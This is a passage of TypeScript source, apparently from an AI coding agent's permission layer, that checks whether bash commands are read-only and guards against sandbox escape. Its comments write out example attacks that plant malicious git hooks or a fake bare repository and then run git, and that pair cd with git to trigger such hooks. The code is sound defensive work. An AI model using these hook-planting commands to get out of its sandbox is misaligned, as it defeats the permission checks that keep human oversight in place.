	let afterDoubleDash = false
	for (const arg of args) {
		if (afterDoubleDash) {
			result.push(arg)
		} else if (arg === "--") {
			afterDoubleDash = true
		} else if (!arg?.startsWith("-")) {
			result.push(arg)
		}
	}
	return result
}

// Commands that only create files at new paths (subset of pathValidation's
// COMMAND_OPERATION_TYPE write/create ops, excluding NON_CREATING_WRITE_COMMANDS
// rm/rmdir/sed which never create new paths).
const CREATING_WRITE_COMMANDS = new Set(["mkdir", "touch", "mv", "cp"])

/**
 * Extracts write paths from a subcommand. Only returns paths for commands that
 * can create new files/directories (mkdir/touch/mv/cp).
 * (Simplified port of extractWritePathsFromSubcommand over PATH_EXTRACTORS:
 * those four commands all use filterOutFlags in the source.)
 */
function extractWritePathsFromSubcommand(subcommand: string): string[] {
	const parsed = tokenizeShellCommand(subcommand)
	if (!parsed.ok) return []

	const strings = parsed.tokens.filter(t => t.kind === "str").map(t => t.value)
	if (strings.length === 0) return []

	const baseCmd = strings[0]
	if (!baseCmd || !CREATING_WRITE_COMMANDS.has(baseCmd)) return []

	return filterOutFlags(strings.slice(1))
}

/**
 * Extracts output redirection targets from a subcommand (simplified port of
 * extractOutputRedirections): every `>`/`>>` operator followed by a word.
 */
function extractOutputRedirectionTargets(subcommand: string): string[] {
	const parsed = tokenizeShellCommand(subcommand)
	if (!parsed.ok) return []
	const targets: string[] = []
	for (let i = 0; i < parsed.tokens.length; i++) {
		const tok = parsed.tokens[i]
		if (tok && tok.kind === "op" && (tok.value === ">" || tok.value === ">>")) {
			const next = parsed.tokens[i + 1]
			if (next && next.kind === "str" && next.value) {
				targets.push(next.value)
			}
		}
	}
	return targets
}

/**
 * Checks if a compound command writes to any git-internal paths.
 * This is used to detect potential sandbox escape attacks where a command
 * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
 *
 * SECURITY: A compound command could bypass the bare repo detection by:
 * 1. Creating bare git repo files (HEAD, objects/, refs/, hooks/) in the same command
 * 2. Then running git, which would execute malicious hooks
 *
 * Example attack:
 * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
 */
function commandWritesToGitInternalPaths(command: string): boolean {
	const subcommands = splitIntoSegments(command)

	for (const subcmd of subcommands) {
		// Check write paths from path-based commands (mkdir, touch, cp, mv)
		for (const path of extractWritePathsFromSubcommand(subcmd)) {
			if (isGitInternalPath(path)) {
				return true
			}
		}

		// Check output redirections (e.g., echo x > hooks/pre-commit)
		for (const target of extractOutputRedirectionTargets(subcmd)) {
			if (isGitInternalPath(target)) {
				return true
			}
		}
	}

	return false
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

/**
 * Checks read-only constraints for bash commands.
 * This is the single exported entry point that validates whether a command is
 * read-only. It handles compound commands and safety checks.
 *
 * Entry order (mirrors readOnlyValidation.ts checkReadOnlyConstraints):
 * tokenize failure → passthrough; injected safety check (heuristic result,
 * behavior !== "passthrough" means suspicious) → passthrough; UNC → ask;
 * git + cd → passthrough; git + bare repo → passthrough; git + write to
 * git-internal paths → passthrough; every segment safety-passthrough AND
 * read-only → allow; otherwise passthrough.
 *
 * @param command The bash command to validate
 * @param opts.isCommandSafe Injected heuristic safety check (bashSecurity);
 *   behavior !== "passthrough" means the command looks suspicious.
 * @param opts.compoundCommandHasCd Pre-computed flag indicating if any cd
 *   command exists in the compound command (computed by the caller to avoid
 *   duplicate computation).
 * @param opts.isCurrentDirBareRepo Whether the current directory looks like a
 *   bare/exploited git repo (injected; defaults to false).
 */
export function checkReadOnlyConstraints(
	command: string,
	opts: {
		isCommandSafe: (cmd: string) => { behavior: string }
		compoundCommandHasCd: boolean
		isCurrentDirBareRepo?: boolean
	},
): ReadOnlyCheck {
	// Detect if the command is not parseable and return early
	const result = tokenizeShellCommand(command)
	if (!result.ok) {
		return {
			behavior: "passthrough",
			message: "Command cannot be parsed, requires further permission checks",
		}
	}

	// Check the original command for safety before splitting (injected).
	if (opts.isCommandSafe(command).behavior !== "passthrough") {
		return {
			behavior: "passthrough",
			message: "Command is not read-only, requires further permission checks",
		}
	}

	// Check for Windows UNC paths in the original command before transformation
	if (containsVulnerableUncPath(command)) {
		return {
			behavior: "ask",
			message: "Command contains Windows UNC path that could be vulnerable to WebDAV attacks",
		}
	}

	// Check once if any subcommand is a git command (used for multiple security checks below)
	const hasGitCommand = splitIntoSegments(command).some(isGitCommandSegment)

	// SECURITY: Block compound commands that have both cd AND git
	// This prevents sandbox escape via: cd /malicious/dir && git status
	// where the malicious directory contains fake git hooks that execute arbitrary code.
	if (opts.compoundCommandHasCd && hasGitCommand) {
		return {
			behavior: "passthrough",
			message: "Compound commands with cd and git require permission checks for enhanced security",
		}
	}

	// SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
	// This prevents sandbox escape when an attacker has:
	// 1. Deleted .git/HEAD to invalidate the normal git directory
	// 2. Created hooks/pre-commit or other git-internal files in the current directory
	// Git would then treat the cwd as the git directory and execute malicious hooks.
	if (hasGitCommand && (opts.isCurrentDirBareRepo ?? false)) {
		return {
			behavior: "passthrough",
			message:
				"Git commands in directories with bare repository structure require permission checks for enhanced security",
		}
	}

	// SECURITY: Block compound commands that write to git-internal paths AND run git
	// This prevents sandbox escape where a command creates git-internal files
	// (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
	// malicious hooks from the newly created files.
	// Example attack: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
	if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
		return {
			behavior: "passthrough",
			message:
				"Compound commands that create git internal files and run git require permission checks for enhanced security",
		}
	}

	// Check if all subcommands are read-only
	const allSubcommandsReadOnly = splitIntoSegments(command).every(subcmd => {
		if (opts.isCommandSafe(subcmd).behavior !== "passthrough") {
			return false
		}
		return isCommandReadOnly(subcmd)
	})

	if (allSubcommandsReadOnly) {
		return {
			behavior: "allow",
		}
	}

	// If not read-only, return passthrough to let other permission checks handle it
	return {
		behavior: "passthrough",
		message: "Command is not read-only, requires further permission checks",
	}
}
